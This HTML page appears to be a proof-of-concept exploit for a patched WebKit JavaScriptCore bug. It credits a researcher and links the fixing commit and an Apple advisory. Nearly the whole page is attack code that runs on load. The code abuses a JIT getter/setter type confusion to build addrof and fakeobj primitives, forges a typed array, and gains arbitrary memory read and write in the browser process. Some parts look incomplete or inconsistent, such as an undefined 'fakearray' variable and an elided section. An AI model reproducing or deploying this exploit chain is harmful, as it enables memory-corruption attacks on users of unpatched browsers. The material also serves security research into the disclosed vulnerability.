<!DOCTYPE html>
<html>
    <head>
        <style>
            body {
                font-family: 'Courier New', Courier, monospace;
                font-size: 4rem;
            }
        </style>
    </head>
<body>
<script src="util.js"></script>
<script src="int64.js"></script>
<script>
    /*
author: @po6ix
commit: https://github.com/WebKit/WebKit/commit/08d5d17c766ffc7ca6a7c833c5720eb71b427784
advisory: https://support.apple.com/en-us/HT213926
*/

let boxed_arr = new Function();
boxed_arr.p1 = 1.1;
boxed_arr[0] = {};

let getter = new Function();
getter.p1 = 1.1;
getter[0] = 1.1;

let shape = {};
for (let i = 0; i < 14; ++i) {
    shape['p'+i] = i;
}

let shapes = [];
for (let i = 0; i < 100; ++i) {
    shapes.push({
        ...shape,
        ['z'+i]: 0x1337
    });
}

function trigger(type) {
    let object_a = {};
    object_a.foo = 1;
    object_a.p1 = 1.1;

    let object_b = {};
    object_b.__defineGetter__('p1', getter);
    object_b.foo = 1;

    function get_getterSetter(type) {
        let o, retval;

        if (type == 0) o = object_a;
        else o = object_b;

        for (let i = 0; i < 2; ++i) {
            if (type == 0) retval = o.foo;
            else retval = o.foo;
        }
        return retval;
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }

    return [getter, get_getterSetter(1)];
}


function pwn() {
    let [getter, getterSetter] = trigger();
    let success = false;
    try {
        getterSetter.toString();
    } catch(e) {
        // it should fail to call toString
        success = true;
    }
    if (!success) {
        alert('failed to get getterSetter');
        return;
    }

    let symbolObject = Object(getterSetter);

    let ref_arr = [];
    for (let i = 0; i < 87; ++i) {
        ref_arr.push(symbolObject.description);
    }

    getter.p13 = 1.1; // change the length of boxed_arr
    let unboxed_arr = getter;
    
    function addrof(o) {
        boxed_arr[8] = o;
        // return unboxed_arr[0];
        return Int64.fromDouble(unboxed_arr[0]);
    }

    function fakeobj(addr) {
        unboxed_arr[0] = addr.asDouble();
        // unboxed_arr[0] = addr;
        return boxed_arr[8];
    }
    
    function lol() {
        log("stage 2");
        // The plan is to
        // 0. Create a lot of Structures for Float64Array instances
        // 1. Setup a fake Float64Array inside another object's inline properties.
        //    The data pointer points into a Uint8Array.
        // 2. Since we don't know the correct structure ID of a Float64Array instance,
        //    we find it using 'instanceof'.
        // 3. We now have an arbitrary read+write primitive since we control the data pointer
        //    of an Uint8Array.
        // 4. We need to fix up a few things so the garbage collector won't crash the process.

        // spray to increase rate of finding structure id
        var structs = [];
        for (var i = 0; i < 0x1000; i++) {
            var a = new Float64Array(1);
            a['prop' + i] = 1337;
            structs.push(a);
        }

        var float64MemView = new Float64Array(0x200);
        var uint8MemView = new Uint8Array(0x1000);

        var jsCellHeader = new Int64([
            00, 0x10, 00, 00,     // m_structureID
            0x0,                  // m_indexingType
            0x27,                 // m_type
            0x18,                 // m_flags
            0x1                   // m_cellState
        ]);

        let container = {
            jsCellHeader: jsCellHeader.asJSValue(),
            butterfly: null,
            vector: uint8MemView,
            length: (new Int64('0x0001000000001337')).asJSValue(),
        };
        
        let container_addr = addrof(container);

        // add offset from container object to its inline properties
        let fake_array_addr = Add(container_addr, 16);
        log("Fake array @ " + fake_array_addr.toString());

        // hard part, will crash if not cleaned up
        let fake_array = fakeobj(fake_array_addr);
        while (!(fake_array instanceof Float64Array)) {
            jsCellHeader.assignAdd(jsCellHeader, Int64.One);
            container.jsCellHeader = jsCellHeader.asJSValue();
        }
        
        // ...

        // We now have an arbitrary read+write primitive since we can overwrite the
        // data pointer of an Uint8Array with an arbitrary address.
        // Optimization: force JIT compilation for these methods.
        //
        memory = {
            read: function(addr, length) {
                fakearray[2] = addr;
                var a = new Array(length);
                for (var i = 0; i < length; i++)
                    a[i] = uint8MemView[i];
                return a;
            },

            readInt64: function(addr) {
                return new Int64(this.read(addr, 8));
            },

            write: function(addr, data) {
                fakearray[2] = addr;
                for (var i = 0; i < data.length; i++)
                    uint8MemView[i] = data[i];
            },

            writeInt64: function(addr, val) {
                return this.write(addr, val.bytes());
            }
        };

        // cleanup
        // Fixup the JSCell header of the container to make it look like an empty object.
        // By default, JSObjects have an inline capacity of 6, enough to hold the fake Float64Array.
        var empty = {};
        var header = memory.read(addrof(empty), 8);
        memory.write(addrof(container), header);

        // Copy the JSCell and Butterfly (will be nullptr) from an existing Float64Array.
        var f64array = new Float64Array(8);
        header = memory.read(addrof(f64array), 16);
        memory.write(addrof(fake_array), header);

        // Set valid flags as well: make it look like an OversizeTypedArray
        // for easy GC survival (see JSGenericTypedArrayView<Adaptor>::visitChildren).
        memory.write(Add(addrof(fake_array), 24), [0x10,0,0,0,1,0,0,0]);

        // Root the container object so it isn't garbage collected.
        // This will allocate a butterfly for the fake object and store a reference to the container there.
        // The fake array itself is rooted by the memory object (closures).
        fakearray.container = container;

        return memory;

    }

        log(`success!!!`);

        // gc gets mad


        // testobject = {};
        // testobject.a = 1;
        // testobject.b = 2;
        // testobject.c = 3;
        // log("testobject addr: " + addrof(testobject).toString() + "<br>testobject properties: ");
        // Object.values(testobject).forEach((prop)=> log(prop));
        // testobjectfake = fakeobj(addrof(testobject));
        // testobjectfake.b = "we out here";
        // testobjectfake.c = 1337;
        // log("<br>fake object addr: " + addrof(testobjectfake).toString() + "<br>fakeobject edited testobject properties:");
        // Object.values(testobject).forEach((prop)=> log(prop));
        lol();
}
pwn();
</script>

</body>
</html>